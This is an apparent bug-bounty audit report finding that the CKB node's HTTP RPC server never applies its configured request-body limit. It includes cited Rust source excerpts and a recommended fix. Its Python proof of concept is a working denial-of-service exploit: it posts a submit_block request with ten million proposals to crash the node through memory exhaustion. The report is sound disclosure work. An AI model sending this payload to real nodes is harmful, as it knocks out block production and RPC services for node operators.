All claims in the submitted report are verified against the actual code:

1. `max_request_body_size` is defined in `RpcConfig` [1](#0-0)  but `RpcServer::new()` never reads or passes it to `start_server`. [2](#0-1) 
2. No `RequestBodyLimit`, `DefaultBodyLimit`, or any body-size middleware exists anywhere in the codebase — grep confirms zero matches.
3. The axum router has no body-limit layer. [3](#0-2) 
4. `handle_jsonrpc` extracts `req_body: Bytes` with no size guard before deserialization. [4](#0-3) 
5. The TCP path does apply a 2 MB `LinesCodec` limit, making HTTP the only unguarded surface. [5](#0-4) 
6. The test setup even sets `max_request_body_size: 20_000_000` but it is never consumed. [6](#0-5) 

---

Audit Report

## Title
`max_request_body_size` Config Never Enforced — Unbounded HTTP Body Allows OOM — (`rpc/src/server.rs`)

## Summary
`RpcConfig.max_request_body_size` is documented and defaults to 10 MiB, but it is never wired into the axum HTTP server. Any caller with HTTP RPC access can POST an arbitrarily large body, causing the process to buffer the entire payload into memory before any size check occurs. A `submit_block` request with millions of `proposals` entries triggers unbounded `Vec<ProposalShortId>` allocation during serde deserialization, exhausting process memory and crashing the node.

## Finding Description
`RpcServer::new()` in `rpc/src/server.rs` accepts `config: RpcConfig` and reads `config.rpc_batch_limit`, `config.listen_address`, `config.ws_listen_address`, and `config.tcp_listen_address`, but never reads `config.max_request_body_size`. `start_server()` builds the axum `Router` with `CorsLayer` and `TimeoutLayer` but no body-limit layer. The `handle_jsonrpc` handler extracts `req_body: Bytes` — axum's default body extractor streams the entire request body into memory with no cap — then passes it directly to `serde_json::from_str::<Request>`. For a `submit_block` call with N proposals, this allocates a `Vec<ProposalShortId>` of N × 10 bytes plus the JSON string (~24 bytes per entry). The TCP path applies a hard 2 MB `LinesCodec::new_with_max_length(2 * 1024 * 1024)` limit, making HTTP the only unguarded surface. No `RequestBodyLimit`, `DefaultBodyLimit`, or equivalent middleware exists anywhere in the codebase.

## Impact Explanation
An attacker with HTTP RPC access can crash the CKB node process via OOM. On Linux the OOM killer terminates the process; on other platforms Rust's allocator panics. Either outcome terminates the node, halting block production, transaction relay, and all RPC services until manually restarted. This matches the allowed CKB bounty impact: **Note (0–500 points) — Any local RPC API crash**.

## Likelihood Explanation
The RPC binds to `127.0.0.1:8114` by default, requiring local access or an operator who has exposed the port. The `max_request_body_size` config field gives operators a false sense of protection — it is documented as active but is dead code. Any local process (e.g., a compromised co-located service) can trigger this without credentials and repeat it indefinitely.

## Recommendation
In `RpcServer::new()`, pass `config.max_request_body_size` into `start_server()` and apply `axum::extract::DefaultBodyLimit::max(max_request_body_size)` as a layer on the axum router, or use `tower_http::limit::RequestBodyLimitLayer::new(max_request_body_size)`. This enforces the limit before the body is buffered into `Bytes`, returning HTTP 413 for oversized requests.

## Proof of Concept
```python
import socket, time

entry = '"0xa0ef4eb5f4ceeb08a4c8"'
proposals = "[" + ",".join([entry] * 10_000_000) + "]"
body = ('{"jsonrpc":"2.0","method":"submit_block","params":["x",'
        '{"header":{"compact_target":"0x0","dao":"0x' + '0'*64 + '",'
        '"epoch":"0x0","extra_hash":"0x' + '0'*64 + '","nonce":"0x0",'
        '"number":"0x0","parent_hash":"0x' + '0'*64 + '",'
        '"proposals_hash":"0x' + '0'*64 + '","timestamp":"0x0",'
        '"transactions_root":"0x' + '0'*64 + '","version":"0x0"},'
        f'"proposals":{proposals},"transactions":[],"uncles":[]'
        '}],"id":1}')

req = (f"POST / HTTP/1.1\r\nHost: 127.0.0.1:8114\r\n"
       f"Content-Type: application/json\r\n"
       f"Content-Length: {len(body)}\r\n\r\n" + body)

s = socket.create_connection(("127.0.0.1", 8114))
s.sendall(req.encode())
time.sleep(5)
print(s.recv(4096))
# Expected: node OOM-killed or panics; no HTTP 413 returned
```

### Citations

**File:** util/app-config/src/configs/rpc.rs (L39-40)
```rust
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
```

**File:** rpc/src/server.rs (L52-95)
```rust
    pub fn new(config: RpcConfig, io_handler: IoHandler, handler: Handle) -> Self {
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }

        let rpc = Arc::new(io_handler);

        let http_address = Self::start_server(
            &rpc,
            config.listen_address.to_owned(),
            handler.clone(),
            false,
        )
        .inspect(|&local_addr| {
            info!("Listen HTTP RPCServer on address: {}", local_addr);
        })
        .unwrap();

        let ws_address = if let Some(addr) = config.ws_listen_address {
            let local_addr =
                Self::start_server(&rpc, addr, handler.clone(), true).inspect(|&addr| {
                    info!("Listen WebSocket RPCServer on address: {}", addr);
                });
            local_addr.ok()
        } else {
            None
        };

        let tcp_address = if let Some(addr) = config.tcp_listen_address {
            let local_addr = handler.block_on(Self::start_tcp_server(rpc, addr, handler.clone()));
            if let Ok(addr) = &local_addr {
                info!("Listen TCP RPCServer on address: {}", addr);
            };
            local_addr.ok()
        } else {
            None
        };

        Self {
            http_address,
            tcp_address,
            ws_address,
        }
    }
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L165-165)
```rust
            let codec = LinesCodec::new_with_max_length(2 * 1024 * 1024);
```

**File:** rpc/src/server.rs (L218-238)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
        Ok(req) => req,
        Err(_) => {
            return make_error_response(jsonrpc_core::Error::parse_error());
        }
    };

    let req = serde_json::from_str::<Request>(req);
```

**File:** rpc/src/tests/setup.rs (L182-182)
```rust
        max_request_body_size: 20_000_000,
```
